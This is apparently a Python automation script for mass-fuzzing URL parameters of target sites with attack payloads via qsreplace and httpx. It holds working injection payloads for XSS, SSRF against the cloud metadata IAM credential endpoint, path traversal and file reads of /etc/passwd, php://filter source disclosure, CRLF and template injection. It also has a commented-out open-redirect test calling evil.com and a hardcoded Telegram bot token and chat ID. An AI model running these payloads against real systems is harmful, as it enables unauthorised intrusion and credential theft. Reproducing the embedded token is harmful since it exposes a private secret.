from time import sleep
import os,sys,random,requests
from colorama import Fore, init
clear = '\x1b[0m'
colors = [31, 32, 33, 34, 35, 36, 37, 38, 39]
fr = Fore.RED
fg = Fore.GREEN
fy = Fore.YELLOW
fw = Fore.WHITE
apiToken = '6121601693:AAHm7lMTJF4x7HN0y0zimuot57_JhD_zqqc'
chatID = '1169622572'
apiURL = f'https://api.telegram.org/bot{apiToken}/sendMessage'


banner = f"""
  {fg}===================================================

             {fr}BOT | FUZZING PARAMETERS

  {fg}===================================================


  """
for N, line in enumerate(banner.split("\n")):
    sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
    sleep(0.05)

sleep(2)
print('xss on...')
os.system('cat xss200.txt | urless | qsreplace "mizera<a href" | ./httpx -match-regex "mizera<a href" | notify')
sleep(2)
os.system('cat xss200.txt | urless | qsreplace "{{this.constructor.constructor(\'alert("foo")\')()}}" | ./httpx -mr "name={{this.constructor.constructor(\'alert("foo")\')}} | notify"')

sleep(2)
os.system('cat xss200.txt | urless | qsreplace "http://169.254.169.254/latest/meta-data/iam/" | ./httpx -match-regex "security-credentials" -H "Host: localhost" | notify')

sleep(2)
#double encode
os.system('cat xss200.txt | urless | qsreplace "../../../../../../../../../../etc/passwd" | ./httpx -match-regex "root:x" -H "Host: localhost" | notify')
#Overlong UTF-8

sleep(2)

#lfi file
os.system('cat xss200.txt | urless | qsreplace "file:///etc/passwd" | ./httpx -match-regex "root:x" -H "Host: localhost" | notify')
#Overlong UTF-8

#double encode
os.system('cat xss200.txt | urless | qsreplace "php://filter/convert.base64-encode/resource=index.php" | ./httpx -match-regex "root:x" -H "Host: localhost" | notify')
#Overlong UTF-8


sleep(2)
#os.system('cat xss200.txt | urless | qsreplace "../../../../../../../windows/win.ini" | ./httpx -match-regex "[mci extensions]" -H "Host: localhost" | notify')

sleep(2)
os.system('cat xss200.txt | urless | qsreplace "//////////////////../../../../../../../../etc/passwd" | ./httpx -match-regex "root:x" -H "Host: localhost" | notify')


#base64 xss
sleep(2)
os.system('cat xss200.txt | urless | qsreplace "bWl6ZXJhPGEgaHJlZj0" | ./httpx -match-regex "mizera<a href=" | notify')




#print('open redirect...')
#os.system('''cat ssrf.txt | grep -a -i \=http | qsreplace 'http://evil.com' | while read host; do curl -s -L "$host" -I | grep -q "evil.com" && echo -e "$host \033[0;31mVulnerable\033[0m"; done | notify''')
#sleep(2)

print('crlf on....')
#os.system('cat xss200.txt | urless | qsreplace "%0d%0aSet-Cookie:xandsz=mizera"  | ./httpx -ms "mizera" | notify')
#os.system('cat xss200.txt | urless | qsreplace "%C0%8D%C0%8ASet-Cookie:xandsz=mizera"  | ./httpx -ms "mizera" | notify')
os.system('cat xss200.txt | urless | qsreplace "%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8A%E5%98%BCa href=mizera"  | ./httpx -ms "<a href=mizera" | notify')
print('ssti on....')
os.system('cat xss200.txt | urless | qsreplace "xandsz{{9*9}}" | ./httpx -match-regex "xandsz81" | notify')
sleep(2)
os.system('cat xss200.txt | urless | qsreplace "xandsz${9*9}"  | ./httpx -match-regex "xandsz81" | notify')
sleep(2)
os.system('cat xss200.txt | urless | qsreplace "xandsz#{{9*9}}" | ./httpx -match-regex "xandsz81" | notify')
sleep(2)
os.system('cat xss200.txt | urless | qsreplace "xandsz{{9*9}}" | ./httpx -match-regex "xandsz81" | notify')
sleep(2)
os.system('cat xss200.txt | urless | qsreplace "${var_dump(((object)$_GET)->nome)}&nome=xandsz" | ./httpx -match-regex "string(6) \"xandsz\"" | notify')
sleep(2)

requests.post(apiURL, json={'chat_id': chatID, 'text': "FUZZIN DE PARAMETROS TERMINADOS!" })
